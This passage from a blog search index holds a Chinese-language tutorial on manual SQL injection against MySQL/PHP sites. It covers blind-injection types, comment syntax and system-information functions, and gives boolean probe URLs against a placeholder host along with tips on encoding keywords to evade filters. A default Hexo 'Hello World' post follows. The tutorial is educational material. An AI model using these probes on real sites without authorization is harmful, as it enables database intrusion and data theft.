Injection):</strong></p><ul><li><strong>布尔型注入 (Boolean-Based Blind Injection):</strong><ul><li>攻击者通过构造SQL语句，利用条件语句的真假来推断数据库中的数据。</li><li>布尔型盲注攻击中，攻击者通过观察应用程序的不同行为来推断条件是否为真。</li></ul></li><li><strong>时间型注入 (Time-Based Blind Injection):</strong><ul><li>攻击者通过在SQL语句中使用时间延迟函数，通过等待时间的长短来判断条件是否为真。</li><li>时间型盲注攻击中，攻击者通过观察应用程序对不同条件的响应时间来推断条件是否为真。</li></ul></li></ul></li></ul><h2 id="mysql-php-手工注入篇"><a href="#mysql-php-手工注入篇" class="headerlink" title="mysql+php 手工注入篇"></a>mysql+php 手工注入篇</h2><h3 id="1、mysql的注释符号"><a href="#1、mysql的注释符号" class="headerlink" title="1、mysql的注释符号"></a>1、mysql的注释符号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">-- 空格</span><br><span class="line"></span><br><span class="line">/*里面的内容都会被注释*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 、 -- 、/**/ 用于注释后后面语句 不再执行</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line"></span><br><span class="line">select * from artile where id=1  #这个部分的语句不再执行</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、注入常用查询系统信息函数"><a href="#2、注入常用查询系统信息函数" class="headerlink" title="2、注入常用查询系统信息函数"></a>2、注入常用查询系统信息函数</h3><ul><li><code>version()</code>  MySQL 版本</li><li><code>user()</code>  数据库用户名</li><li><code>database</code>  数据库名</li><li><code>@@datadir</code>  数据库路径</li><li><code>@@version_compile_os</code>  操作系统版本</li></ul><h3 id="3、判断是否存在注入-1"><a href="#3、判断是否存在注入-1" class="headerlink" title="3、判断是否存在注入"></a>3、判断是否存在注入</h3><p>使用 <code>&amp;&amp;</code> 与 <code>||</code> 这种特殊符号时，需要在浏览器中对URL进行转码后才能提交，因为浏览器默认不会进行编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 页面是否返回正常，或是否存在报错信息</span><br><span class="line"># 双方为真或者一方为真时返回正常，双方为假时返回空出现错误</span><br><span class="line"># and 函数：</span><br><span class="line"># 例子：</span><br><span class="line">http://target_sys.com/article.php?id=1 and 1=1 # 正常</span><br><span class="line">http://target_sys.com/article.php?id=1 and 1=2 # 失败</span><br><span class="line">/*</span><br><span class="line">解释：攻击者尝试通过在原始查询中追加 and 1=1 或 and 1=2 的条件，来观察页面的返回情况。</span><br><span class="line">当 and 1=1 为真时，页面正常返回，表示注入点存在并且条件成立。</span><br><span class="line">当 and 1=2 为真时，页面返回错误或为空，表示条件不成立，可能是注入点不存在或者条件错误。</span><br><span class="line">URL 转译：攻击者可能会尝试绕过安全防护，将关键字如 and 转译为其他形式，如 &amp;&amp; 或 %26%26。</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"># or 函数：</span><br><span class="line"># 例子：</span><br><span class="line">http://target_sys.com/article.php?id=1 or 1=1 # 正常</span><br><span class="line">http://target_sys.com/article.php?id=-1 or 1=2 # 错误</span><br><span class="line">http://target_sys.com/article.php?id=-1 or 1=1 # 正常</span><br><span class="line">/*</span><br><span class="line">解释：攻击者尝试通过在原始查询中追加 or 1=1 或 or 1=2 的条件，来观察页面的返回情况。</span><br><span class="line">当 or 1=1 为真时，页面正常返回，表示注入点存在并且条件成立。</span><br><span class="line">当 or 1=2 为真时，页面返回错误或为空，表示条件不成立，可能是注入点不存在或者条件错误。</span><br><span class="line">URL 转译：攻击者可能会尝试绕过安全防护，将关键字如 or 转译为其他形式，如 %20 表示空格。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/02/20/hello-world/"/>
      <url>/2024/02/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
